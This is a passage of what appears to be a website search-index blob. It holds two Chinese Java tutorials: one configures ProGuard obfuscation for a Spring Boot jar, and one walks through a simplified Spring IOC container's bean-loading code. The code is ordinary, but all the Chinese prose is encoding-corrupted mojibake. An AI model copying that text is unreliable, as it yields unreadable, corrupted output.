proguard",charIndex:2643}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"æ·»å ä¾èµ éç½®ProGuard",content:"ProGuard æ¯ä¸ä¸ªç¨äº Java åºç¨ç¨åºçä»£ç æ··æ·åä¼åå·¥å·ï¼éå¸¸ç¨äº Android åºç¨ç¨åºï¼ä½åæ ·éç¨äº Spring Boot åºç¨ç¨åºãæ··æ·ä»£ç å¯ä»¥å¢å¼ºå®å¨æ§ï¼å¹¶åå°åºç¨ç¨åºçä½ç§¯ãä½¿ç¨ proguard æ··æ·ä»£ç åªè½å¢å éè¯»åçè§£çé¾åº¦ï¼å¹¶ä¸è½ç¾åç¾ä¿è¯ä»£ç å®å¨ãä¹å³æ¯è¾¾å°è®©å¼åäººåçå°è¿å¤´ççä»£ç æ 99.99999% çå²å¨æ¾å¼éè¯»ï¼ææ¡å­è¯´è¿ä¸å¦æéåä¸éé»è¾ãä½æ¯å¦æä¸äºéè¦çéææ°æ®ä¾ç¶ä¼æ´æ¼\n\n\n# æ·»å ä¾èµ\n\né¦åï¼ä½ éè¦å¨é¡¹ç®çæå»ºæä»¶ï¼éå¸¸æ¯ build.gradle æ pom.xmlï¼ä¸­æ·»å  ProGuard çä¾èµã\n\n\x3c!-- æ··æ· --\x3e\n<plugin>\n  <groupId>com.github.wvengen</groupId>\n  <artifactId>proguard-maven-plugin</artifactId>\n  <version>2.6.0</version>\n  <executions>\n    \x3c!-- ä»¥ä¸éç½®è¯´ææ§è¡mvnçpackageå½ä»¤æ¶åï¼ä¼æ§è¡proguard--\x3e\n    <execution>\n      <phase>package</phase>\n      <goals>\n        <goal>proguard</goal>\n      </goals>\n    </execution>\n  </executions>\n  <configuration>\n    \x3c!--  CreateProcess error=206, æä»¶åææ©å±åå¤ªé¿ --\x3e\n    <putLibraryJarsInTempDir>true</putLibraryJarsInTempDir>\n    \x3c!-- å°±æ¯è¾å¥Jarçåç§°ï¼æä»¬è¦ç¥éï¼ä»£ç æ··æ·å¶å®æ¯å°ä¸ä¸ªåå§çjarï¼çæä¸ä¸ªæ··æ·åçjarï¼é£ä¹å°±ä¼æè¾å¥è¾åºã --\x3e\n    <injar>${project.build.finalName}.jar</injar>\n    \x3c!-- è¾åºjaråç§°ï¼è¾å¥è¾åºjarååçæ¶åå°±æ¯è¦çï¼ä¹æ¯æ¯è¾å¸¸ç¨çéç½®ã --\x3e\n    <outjar>${project.build.finalName}.jar</outjar>\n    \x3c!-- æ¯å¦æ··æ· é»è®¤æ¯true --\x3e\n    <obfuscate>true</obfuscate>\n    \x3c!-- éç½®ä¸ä¸ªæä»¶ï¼éå¸¸å«åproguard.cfg,è¯¥æä»¶ä¸»è¦æ¯éç½®optionséé¡¹ï¼ä¹å°±æ¯è¯´ä½¿ç¨proguard.cfgé£ä¹optionsä¸çææåå®¹é½å¯ä»¥ç§»å°proguard.cfgä¸­ --\x3e\n    <proguardInclude>${project.basedir}/proguard.cfg</proguardInclude>\n    \x3c!-- é¢å¤çjaråï¼éå¸¸æ¯é¡¹ç®ç¼è¯æéè¦çjar --\x3e\n    <libs>\n      <lib>${java.home}/lib/rt.jar</lib>\n      <lib>${java.home}/lib/jce.jar</lib>\n      <lib>${java.home}/lib/jsse.jar</lib>\n    </libs>\n    \x3c!-- å¯¹è¾å¥jarè¿è¡è¿æ»¤æ¯å¦ï¼å¦ä¸éç½®å°±æ¯å¯¹META-INFOæä»¶ä¸å¤çã --\x3e\n    <inLibsFilter>!META-INF/**,!META-INF/versions/9/**.class</inLibsFilter>\n    \x3c!-- è¿æ¯è¾åºè·¯å¾éç½®ï¼ä½æ¯è¦æ³¨æè¿ä¸ªè·¯å¾å¿é¡»è¦åæ¬injaræ ç­¾å¡«åçjar --\x3e\n    <outputDirectory>${project.basedir}/target</outputDirectory>\n    \x3c!--è¿éç¹å«éè¦ï¼æ­¤å¤ä¸»è¦æ¯éç½®æ··æ·çä¸äºç»èéé¡¹ï¼æ¯å¦åªäºç±»ä¸éè¦æ··æ·ï¼åªäºéè¦æ··æ·--\x3e\n    <options>\n      \x3c!-- å¯ä»¥å¨æ­¤å¤åoptionæ ç­¾éç½®ï¼ä¸è¿æä¸é¢ä½¿ç¨äºproguardIncludeï¼æèææ´åæ¬¢å¨proguard.cfgä¸­éç½® --\x3e\n    </options>\n  </configuration>\n</plugin>\n\x3c!-- spring,æ³¨æä¸å®è¦æ¾å¨æ··æ·æä»¶ä¹å --\x3e\n<plugin>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-maven-plugin</artifactId>\n  <configuration>\n    <excludes>\n      <exclude>\n        <groupId>org.projectlombok</groupId>\n        <artifactId>lombok</artifactId>\n      </exclude>\n    </excludes>\n  </configuration>\n  <executions>\n    <execution>\n      \x3c!-- spingboot æåéè¦repackageå¦åä¸æ¯å¯æ§è¡jar --\x3e\n      <goals>\n        <goal>repackage</goal>\n      </goals>\n      <configuration>\n        <mainClass>com.aizuda.easyManagerTool.ToolBootApplication</mainClass>\n      </configuration>\n    </execution>\n  </executions>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n\n# éç½® ProGuard\n\n#æå®Javaççæ¬\n-target 1.8\n#proguardä¼å¯¹ä»£ç è¿è¡ä¼ååç¼©ï¼ä»ä¼å é¤ä»æªä½¿ç¨çç±»æèç±»æååéç­\n-dontshrink\n#æ¯å¦å³é­å­èç çº§å«çä¼åï¼å¦æä¸å¼å¯åè®¾ç½®å¦ä¸éç½®\n-dontoptimize\n#æ··æ·æ¶ä¸çæå¤§å°åæ··åçç±»åï¼é»è®¤æ¯å¯ä»¥å¤§å°åæ··å\n-dontusemixedcaseclassnames\n# å¯¹äºç±»æåçå½åçæ··æ·éåå¯ä¸ç­ç¥\n-useuniqueclassmembernames\n#æ··æ·æ¶ä¸çæå¤§å°åæ··åçç±»åï¼é»è®¤æ¯å¯ä»¥å¤§å°åæ··å\n-dontusemixedcaseclassnames\n#æ··æ·ç±»åä¹åï¼å¯¹ä½¿ç¨Class.forName('className')ä¹ç±»çå°æ¹è¿è¡ç¸åºæ¿ä»£\n-adaptclassstrings\n\n#å¯¹å¼å¸¸ãæ³¨è§£ä¿¡æ¯äºä»¥ä¿ç\n-keepattributes Exceptions,InnerClasses,Signature,Deprecated,SourceFile,LineNumberTable,*Annotation*,EnclosingMethod\n# æ­¤éé¡¹å°ä¿å­æ¥å£ä¸­çææåå§åç§°ï¼ä¸æ··æ·ï¼--\x3e\n#-keepnames interface ** { *; }\n# æ­¤éé¡¹å°ä¿å­ææè½¯ä»¶åä¸­çææåå§æ¥å£æä»¶ï¼ä¸è¿è¡æ··æ·ï¼\n#-keep interface * extends * { *; }\n#ä¿çåæ°åï¼å ä¸ºæ§å¶å¨ï¼æèMybatisç­æ¥å£çåæ°å¦ææ··æ·ä¼å¯¼è´æ æ³æ¥ååæ°ï¼xmlæä»¶æ¾ä¸å°åæ°\n-keepparameternames\n# ä¿çæä¸¾æååæ¹æ³\n-keepclassmembers enum * { *; }\n# ä¸æ··æ·ææç±»,ä¿å­åå§å®ä¹çæ³¨é-\n-keepclassmembers class * {\n    @org.springframework.context.annotation.Bean *;\n    @org.springframework.beans.factory.annotation.Autowired *;\n    @org.springframework.beans.factory.annotation.Value *;\n    @org.springframework.stereotype.Service *;\n    @org.springframework.stereotype.Component *;\n}\n\n#å¿½ç¥warnæ¶æ¯\n-ignorewarnings\n#å¿½ç¥noteæ¶æ¯\n-dontnote\n#æå°éç½®ä¿¡æ¯\n-printconfiguration\n-keep public class com.aizuda.easyManagerTool.ToolBootApplication {\n        public static void main(java.lang.String[]);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n",normalizedContent:"proguard æ¯ä¸ä¸ªç¨äº java åºç¨ç¨åºçä»£ç æ··æ·åä¼åå·¥å·ï¼éå¸¸ç¨äº android åºç¨ç¨åºï¼ä½åæ ·éç¨äº spring boot åºç¨ç¨åºãæ··æ·ä»£ç å¯ä»¥å¢å¼ºå®å¨æ§ï¼å¹¶åå°åºç¨ç¨åºçä½ç§¯ãä½¿ç¨ proguard æ··æ·ä»£ç åªè½å¢å éè¯»åçè§£çé¾åº¦ï¼å¹¶ä¸è½ç¾åç¾ä¿è¯ä»£ç å®å¨ãä¹å³æ¯è¾¾å°è®©å¼åäººåçå°è¿å¤´ççä»£ç æ 99.99999% çå²å¨æ¾å¼éè¯»ï¼ææ¡å­è¯´è¿ä¸å¦æéåä¸éé»è¾ãä½æ¯å¦æä¸äºéè¦çéææ°æ®ä¾ç¶ä¼æ´æ¼\n\n\n# æ·»å ä¾èµ\n\né¦åï¼ä½ éè¦å¨é¡¹ç®çæå»ºæä»¶ï¼éå¸¸æ¯ build.gradle æ pom.xmlï¼ä¸­æ·»å  proguard çä¾èµã\n\n\x3c!-- æ··æ· --\x3e\n<plugin>\n  <groupid>com.github.wvengen</groupid>\n  <artifactid>proguard-maven-plugin</artifactid>\n  <version>2.6.0</version>\n  <executions>\n    \x3c!-- ä»¥ä¸éç½®è¯´ææ§è¡mvnçpackageå½ä»¤æ¶åï¼ä¼æ§è¡proguard--\x3e\n    <execution>\n      <phase>package</phase>\n      <goals>\n        <goal>proguard</goal>\n      </goals>\n    </execution>\n  </executions>\n  <configuration>\n    \x3c!--  createprocess error=206, æä»¶åææ©å±åå¤ªé¿ --\x3e\n    <putlibraryjarsintempdir>true</putlibraryjarsintempdir>\n    \x3c!-- å°±æ¯è¾å¥jarçåç§°ï¼æä»¬è¦ç¥éï¼ä»£ç æ··æ·å¶å®æ¯å°ä¸ä¸ªåå§çjarï¼çæä¸ä¸ªæ··æ·åçjarï¼é£ä¹å°±ä¼æè¾å¥è¾åºã --\x3e\n    <injar>${project.build.finalname}.jar</injar>\n    \x3c!-- è¾åºjaråç§°ï¼è¾å¥è¾åºjarååçæ¶åå°±æ¯è¦çï¼ä¹æ¯æ¯è¾å¸¸ç¨çéç½®ã --\x3e\n    <outjar>${project.build.finalname}.jar</outjar>\n    \x3c!-- æ¯å¦æ··æ· é»è®¤æ¯true --\x3e\n    <obfuscate>true</obfuscate>\n    \x3c!-- éç½®ä¸ä¸ªæä»¶ï¼éå¸¸å«åproguard.cfg,è¯¥æä»¶ä¸»è¦æ¯éç½®optionséé¡¹ï¼ä¹å°±æ¯è¯´ä½¿ç¨proguard.cfgé£ä¹optionsä¸çææåå®¹é½å¯ä»¥ç§»å°proguard.cfgä¸­ --\x3e\n    <proguardinclude>${project.basedir}/proguard.cfg</proguardinclude>\n    \x3c!-- é¢å¤çjaråï¼éå¸¸æ¯é¡¹ç®ç¼è¯æéè¦çjar --\x3e\n    <libs>\n      <lib>${java.home}/lib/rt.jar</lib>\n      <lib>${java.home}/lib/jce.jar</lib>\n      <lib>${java.home}/lib/jsse.jar</lib>\n    </libs>\n    \x3c!-- å¯¹è¾å¥jarè¿è¡è¿æ»¤æ¯å¦ï¼å¦ä¸éç½®å°±æ¯å¯¹meta-infoæä»¶ä¸å¤çã --\x3e\n    <inlibsfilter>!meta-inf/**,!meta-inf/versions/9/**.class</inlibsfilter>\n    \x3c!-- è¿æ¯è¾åºè·¯å¾éç½®ï¼ä½æ¯è¦æ³¨æè¿ä¸ªè·¯å¾å¿é¡»è¦åæ¬injaræ ç­¾å¡«åçjar --\x3e\n    <outputdirectory>${project.basedir}/target</outputdirectory>\n    \x3c!--è¿éç¹å«éè¦ï¼æ­¤å¤ä¸»è¦æ¯éç½®æ··æ·çä¸äºç»èéé¡¹ï¼æ¯å¦åªäºç±»ä¸éè¦æ··æ·ï¼åªäºéè¦æ··æ·--\x3e\n    <options>\n      \x3c!-- å¯ä»¥å¨æ­¤å¤åoptionæ ç­¾éç½®ï¼ä¸è¿æä¸é¢ä½¿ç¨äºproguardincludeï¼æèææ´åæ¬¢å¨proguard.cfgä¸­éç½® --\x3e\n    </options>\n  </configuration>\n</plugin>\n\x3c!-- spring,æ³¨æä¸å®è¦æ¾å¨æ··æ·æä»¶ä¹å --\x3e\n<plugin>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-maven-plugin</artifactid>\n  <configuration>\n    <excludes>\n      <exclude>\n        <groupid>org.projectlombok</groupid>\n        <artifactid>lombok</artifactid>\n      </exclude>\n    </excludes>\n  </configuration>\n  <executions>\n    <execution>\n      \x3c!-- spingboot æåéè¦repackageå¦åä¸æ¯å¯æ§è¡jar --\x3e\n      <goals>\n        <goal>repackage</goal>\n      </goals>\n      <configuration>\n        <mainclass>com.aizuda.easymanagertool.toolbootapplication</mainclass>\n      </configuration>\n    </execution>\n  </executions>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n\n# éç½® proguard\n\n#æå®javaççæ¬\n-target 1.8\n#proguardä¼å¯¹ä»£ç è¿è¡ä¼ååç¼©ï¼ä»ä¼å é¤ä»æªä½¿ç¨çç±»æèç±»æååéç­\n-dontshrink\n#æ¯å¦å³é­å­èç çº§å«çä¼åï¼å¦æä¸å¼å¯åè®¾ç½®å¦ä¸éç½®\n-dontoptimize\n#æ··æ·æ¶ä¸çæå¤§å°åæ··åçç±»åï¼é»è®¤æ¯å¯ä»¥å¤§å°åæ··å\n-dontusemixedcaseclassnames\n# å¯¹äºç±»æåçå½åçæ··æ·éåå¯ä¸ç­ç¥\n-useuniqueclassmembernames\n#æ··æ·æ¶ä¸çæå¤§å°åæ··åçç±»åï¼é»è®¤æ¯å¯ä»¥å¤§å°åæ··å\n-dontusemixedcaseclassnames\n#æ··æ·ç±»åä¹åï¼å¯¹ä½¿ç¨class.forname('classname')ä¹ç±»çå°æ¹è¿è¡ç¸åºæ¿ä»£\n-adaptclassstrings\n\n#å¯¹å¼å¸¸ãæ³¨è§£ä¿¡æ¯äºä»¥ä¿ç\n-keepattributes exceptions,innerclasses,signature,deprecated,sourcefile,linenumbertable,*annotation*,enclosingmethod\n# æ­¤éé¡¹å°ä¿å­æ¥å£ä¸­çææåå§åç§°ï¼ä¸æ··æ·ï¼--\x3e\n#-keepnames interface ** { *; }\n# æ­¤éé¡¹å°ä¿å­ææè½¯ä»¶åä¸­çææåå§æ¥å£æä»¶ï¼ä¸è¿è¡æ··æ·ï¼\n#-keep interface * extends * { *; }\n#ä¿çåæ°åï¼å ä¸ºæ§å¶å¨ï¼æèmybatisç­æ¥å£çåæ°å¦ææ··æ·ä¼å¯¼è´æ æ³æ¥ååæ°ï¼xmlæä»¶æ¾ä¸å°åæ°\n-keepparameternames\n# ä¿çæä¸¾æååæ¹æ³\n-keepclassmembers enum * { *; }\n# ä¸æ··æ·ææç±»,ä¿å­åå§å®ä¹çæ³¨é-\n-keepclassmembers class * {\n    @org.springframework.context.annotation.bean *;\n    @org.springframework.beans.factory.annotation.autowired *;\n    @org.springframework.beans.factory.annotation.value *;\n    @org.springframework.stereotype.service *;\n    @org.springframework.stereotype.component *;\n}\n\n#å¿½ç¥warnæ¶æ¯\n-ignorewarnings\n#å¿½ç¥noteæ¶æ¯\n-dontnote\n#æå°éç½®ä¿¡æ¯\n-printconfiguration\n-keep public class com.aizuda.easymanagertool.toolbootapplication {\n        public static void main(java.lang.string[]);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n",charsets:{cjk:!0}},{title:"æ ¸å¿åå®¹æè§£ IOC",frontmatter:{title:"æ ¸å¿åå®¹æè§£ IOC",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/200/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/21.spring/200.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20IOC.html",relativePath:"00.java/20.Spring/21.spring/200.æ ¸å¿åå®¹æè§£ IOC.md",key:"v-5ba1bd3a",path:"/spring/spring/200/",headers:[{level:2,title:"è¯»åXMLæä»¶",slug:"è¯»åxmlæä»¶",normalizedTitle:"è¯»å xml æä»¶",charIndex:266},{level:2,title:"å°è£ BeanDefinition",slug:"å°è£-beandefinition",normalizedTitle:"å°è£ beandefinition",charIndex:1752},{level:2,title:"BeanFactoryPostProcessor",slug:"beanfactorypostprocessor",normalizedTitle:"beanfactorypostprocessor",charIndex:6633},{level:2,title:"æ³¨åå®ç°BeanPostProcessorçç±»",slug:"æ³¨åå®ç°beanpostprocessorçç±»",normalizedTitle:"æ³¨åå®ç° beanpostprocessor çç±»",charIndex:8907},{level:2,title:"å®ä¾åBean",slug:"å®ä¾åbean",normalizedTitle:"å®ä¾å bean",charIndex:9031},{level:2,title:"æ³¨è§£å±æ§å¡«å",slug:"æ³¨è§£å±æ§å¡«å",normalizedTitle:"æ³¨è§£å±æ§å¡«å",charIndex:233},{level:2,title:"XMLå±æ§å¡«å",slug:"xmlå±æ§å¡«å",normalizedTitle:"xml å±æ§å¡«å",charIndex:244},{level:2,title:"æç¥å¯¹è±¡",slug:"æç¥å¯¹è±¡",normalizedTitle:"æç¥å¯¹è±¡",charIndex:18936},{level:2,title:"åå§åæ¹æ³ä¹å",slug:"åå§åæ¹æ³ä¹å",normalizedTitle:"åå§åæ¹æ³ä¹å",charIndex:20221},{level:2,title:"Beançåå§åæ¹æ³",slug:"beançåå§åæ¹æ³",normalizedTitle:"bean çåå§åæ¹æ³",charIndex:11230},{level:2,title:"åå§åæ¹æ³ä¹å",slug:"åå§åæ¹æ³ä¹å",normalizedTitle:"åå§åæ¹æ³ä¹å",charIndex:22301},{level:2,title:"æ³¨åéæ¯äºä»¶",slug:"æ³¨åéæ¯äºä»¶",normalizedTitle:"æ³¨åéæ¯äºä»¶",charIndex:22789},{level:2,title:"scopå¤çåä¾",slug:"scopå¤çåä¾",normalizedTitle:"scop å¤çåä¾",charIndex:25471}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"è¯»åXMLæä»¶ å°è£ BeanDefinition BeanFactoryPostProcessor æ³¨åå®ç°BeanPostProcessorçç±» å®ä¾åBean æ³¨è§£å±æ§å¡«å XMLå±æ§å¡«å æç¥å¯¹è±¡ åå§åæ¹æ³ä¹å Beançåå§åæ¹æ³ åå§åæ¹æ³ä¹å æ³¨åéæ¯äºä»¶ scopå¤çåä¾",content:'Spring æ¯ JAVA å¼åç¨å°æå¤çä¸ä¸ª WEB æ¡æ¶ï¼æ ¸å¿æ¯ IOCï¼æ§å¶åè½¬ï¼å AOPï¼é¢ååé¢ï¼ï¼ä½åä¸ºæ¶æï¼æ³è¦å¯¹ Spring è¦è¿è¡æ©å±ç­ï¼å¿é¡»è¦äºè§£ Spring ççå½å¨æãäºä»¶ãAOPãè¡ä¸ºæç¥ç­ãSpring çå½å¨æå¦ä¸å¾ï¼\n\n\n\næç¤º\n\næ¬æä¸»è¦äºè§£ spring çå½å¨æçæåªäºï¼ä»¥åä»ä»¬çæ ¸å¿ä»£ç æ¯æä¹ç¼åï¼æ´ä¸ªè¿ç¨æ¯å IOC å DI çï¼IOC å°å¯¹è±¡çåå»ºåä¾èµå³ç³»çç»´æ¤ä»ä»£ç ä¸­è±ç¦»åºæ¥ï¼éè¿éç½®è¯»ååå»ºå¯¹è±¡ï¼DI ä»æ³¨è§£å±æ§å¡«åè¿ç¨ä»¥å XML å±æ§å¡«åè¿ç¨ä¸ºå·ä½çä½ç°ã\n\n\n# è¯»å XML æä»¶\n\néè¿ ClassPathXmlApplicationContext æ¥è¯»åèµæºæä»¶ä¸ç spring.xml\n\n    @Test\n    public void test() {\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring.xml");\n        UserService userService = applicationContext.getBean("userService", UserService.class);\n        System.out.println("æµè¯ç»æï¼" + userService.queryUserInfo());\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\næ ¹æ®æä»¶ç±»åä½¿ç¨ä¸åçæ¹å¼è¯»åå°æµä¸­\n\n    @Override\n    public Resource getResource(String location) {\n        Assert.notNull(location, "Location must not be null");\n        if (location.startsWith(CLASSPATH_URL_PREFIX)) {\n            return new ClassPathResource(location.substring(CLASSPATH_URL_PREFIX.length()));\n        }\n        else {\n            try {\n                URL url = new URL(location);\n                return new UrlResource(url);\n            } catch (MalformedURLException e) {\n                return new FileSystemResource(location);\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nè°ç¨ XML è§£æ\n\n    @Override\n    public void loadBeanDefinitions(Resource resource) throws BeansException {\n        try {\n            try (InputStream inputStream = resource.getInputStream()) {\n                doLoadBeanDefinitions(inputStream);\n            }\n        } catch (IOException | ClassNotFoundException | DocumentException e) {\n            throw new BeansException("IOException parsing XML document from " + resource, e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# å°è£ BeanDefinition\n\nè§£æ XML çæ´ä¸ªè¿ç¨ï¼\n\n * è§£æ DOM\n * è§£æå¸¦æ @Component æ³¨è§£çç±»ï¼å¹¶å°è£ä¸º BeanDefinition æ³¨åå° BeanFactory\n * è§£æä¸æ¯ component-scan å®ä¹çç±»\n\n    protected void doLoadBeanDefinitions(InputStream inputStream) throws ClassNotFoundException, DocumentException {\n        // ä½¿ç¨ org.dom4j.io çè§£æå¨\n        SAXReader reader = new SAXReader();\n        Document document = reader.read(inputStream);\n        Element root = document.getRootElement();\n        // è§£æ context:component-scan æ ç­¾ï¼æ«æåä¸­çç±»å¹¶æåç¸å³ä¿¡æ¯ï¼ç¨äºç»è£ BeanDefinition\n        Element componentScan = root.element("component-scan");\n        if (null != componentScan) {\n            String scanPath = componentScan.attributeValue("base-package");\n            if (StrUtil.isEmpty(scanPath)) {\n                throw new BeansException("The value of base-package attribute can not be empty or null");\n            }\n            // æ«ææ´ä¸ªå\n            scanPackage(scanPath);\n        }\n        List<Element> beanList = root.elements("bean");\n        for (Element bean : beanList) {\n            String id = bean.attributeValue("id");\n            String name = bean.attributeValue("name");\n            String className = bean.attributeValue("class");\n            String initMethod = bean.attributeValue("init-method");\n            String destroyMethodName = bean.attributeValue("destroy-method");\n            String beanScope = bean.attributeValue("scope");\n            // è·å Classï¼æ¹ä¾¿è·åç±»ä¸­çåç§°\n            Class<?> clazz = Class.forName(className);\n            // ä¼åçº§ id > name\n            String beanName = StrUtil.isNotEmpty(id) ? id : name;\n            if (StrUtil.isEmpty(beanName)) {\n                beanName = StrUtil.lowerFirst(clazz.getSimpleName());\n            }\n            // å®ä¹Bean\n            BeanDefinition beanDefinition = new BeanDefinition(clazz);\n            beanDefinition.setInitMethodName(initMethod);\n            beanDefinition.setDestroyMethodName(destroyMethodName);\n            if (StrUtil.isNotEmpty(beanScope)) {\n                beanDefinition.setScope(beanScope);\n            }\n            List<Element> propertyList = bean.elements("property");\n            // è¯»åå±æ§å¹¶å¡«å\n            for (Element property : propertyList) {\n                // è§£ææ ç­¾ï¼property\n                String attrName = property.attributeValue("name");\n                String attrValue = property.attributeValue("value");\n                String attrRef = property.attributeValue("ref");\n                // è·åå±æ§å¼ï¼å¼å¥å¯¹è±¡ãå¼å¯¹è±¡\n                Object value = StrUtil.isNotEmpty(attrRef) ? new BeanReference(attrRef) : attrValue;\n                // åå»ºå±æ§ä¿¡æ¯\n                PropertyValue propertyValue = new PropertyValue(attrName, value);\n                beanDefinition.getPropertyValues().addPropertyValue(propertyValue);\n            }\n            if (getRegistry().containsBeanDefinition(beanName)) {\n                throw new BeansException("Duplicate beanName[" + beanName + "] is not allowed");\n            }\n            // æ³¨å BeanDefinition\n            getRegistry().registerBeanDefinition(beanName, beanDefinition);\n        }\n    }\n\n    private void scanPackage(String scanPath) {\n        String[] basePackages = StrUtil.splitToArray(scanPath, \',\');\n        ClassPathBeanDefinitionScanner scanner = new ClassPathBeanDefinitionScanner(getRegistry());\n        scanner.doScan(basePackages);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\næ ¹æ®æä¾è·¯å¾å°è£ä¸º BeanDefinition å¹¶æ³¨åå° BeanFactory\n\n    public void doScan(String... basePackages) {\n        for (String basePackage : basePackages) {\n            Set<BeanDefinition> candidates = findCandidateComponents(basePackage);\n            for (BeanDefinition beanDefinition : candidates) {\n                // è§£æ Bean çä½ç¨å singletonãprototype\n                String beanScope = resolveBeanScope(beanDefinition);\n                if (StrUtil.isNotEmpty(beanScope)) {\n                    beanDefinition.setScope(beanScope);\n                }\n                registry.registerBeanDefinition(determineBeanName(beanDefinition), beanDefinition);\n            }\n        }\n\n        // æ³¨åå¤çæ³¨è§£ç BeanPostProcessor(@Autowiredã@Value)\n        registry.registerBeanDefinition("cn.bugstack.springframework.context.annotation.internalAutowiredAnnotationProcessor", new BeanDefinition(AutowiredAnnotationBeanPostProcessor.class));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¯¹æä¾çåè·¯å¾æ«ææ @Component æ³¨è§£çç±»\n\n    public Set<BeanDefinition> findCandidateComponents(String basePackage) {\n        Set<BeanDefinition> candidates = new LinkedHashSet<>();\n        Set<Class<?>> classes = ClassUtil.scanPackageByAnnotation(basePackage, Component.class);\n        for (Class<?> clazz : classes) {\n            candidates.add(new BeanDefinition(clazz));\n        }\n        return candidates;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# BeanFactoryPostProcessor\n\nBeanFactoryPostProcessor å¯ä»¥ä¿®æ¹æä»¬å¯¹ BeanDefinition å®ä¹çææä¿¡æ¯ï¼å¯ä»¥æ·»å å±æ§ï¼ä¿®æ¹å±æ§ï¼æ·»å é¢å¤çæ¹æ³ç­ãå·ä½ä¼å¯¹ææå®ç° BeanFactoryPostProcessor çç±»è¿è¡è·åï¼å¹¶å¾ªç¯è°ç¨ postProcessBeanFactory æ¹æ³\n\n    private void invokeBeanFactoryPostProcessors(ConfigurableListableBeanFactory beanFactory) {\n        Map<String, BeanFactoryPostProcessor> beanFactoryPostProcessorMap = beanFactory.getBeansOfType(BeanFactoryPostProcessor.class);\n        for (BeanFactoryPostProcessor beanFactoryPostProcessor : beanFactoryPostProcessorMap.values()) {\n            beanFactoryPostProcessor.postProcessBeanFactory(beanFactory);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\næä¾ä¸ä¸ªé»è®¤çå®ç°\n\n    @Override\n    public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException {\n        try {\n            // å è½½å±æ§æä»¶\n            DefaultResourceLoader resourceLoader = new DefaultResourceLoader();\n            Resource resource = resourceLoader.getResource(location);\n\n            // æå±æ§æä»¶çåå®¹å è½½å°Propertieséç»æé®å¼å¯¹\n            Properties properties = new Properties();\n            properties.load(resource.getInputStream());\n            String[] beanDefinitionNames = beanFactory.getBeanDefinitionNames();\n            for (String beanName : beanDefinitionNames) {\n                BeanDefinition beanDefinition = beanFactory.getBeanDefinition(beanName);\n                PropertyValues propertyValues = beanDefinition.getPropertyValues();\n                for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                    Object value = propertyValue.getValue();\n                    if (!(value instanceof String)) continue;\n                    value = resolvePlaceholder((String) value, properties);\n                    propertyValues.addPropertyValue(new PropertyValue(propertyValue.getName(), value));\n                }\n            }\n            // åå®¹å¨ä¸­æ·»å å­ç¬¦ä¸²è§£æå¨ï¼ä¾è§£æ@Valueæ³¨è§£ä½¿ç¨\n            StringValueResolver valueResolver = new PlaceholderResolvingStringValueResolver(properties);\n            // æ³¨åå°å®¹å¨ï¼ä»¥ä¾¿åç»­ä½¿ç¨\n            beanFactory.addEmbeddedValueResolver(valueResolver);\n        } catch (IOException e) {\n            throw new BeansException("Could not load properties", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# æ³¨åå®ç° BeanPostProcessor çç±»\n\nBeanPostProcessor å°±æ¯æä¾äº postProcessBeforeInitializationï¼postProcessAfterInitialization ä¸¤ç§æ¹æ³ï¼æä¾æä»¬å¨å®ä¾å Bean çæ¶åï¼ææå®ç° BeanPostProcessor çç±»ï¼æ³¨åå° List<BeanPostProcessor> beanPostProcessors = new ArrayList<BeanPostProcessor>(); ä¸­\n\n    private void 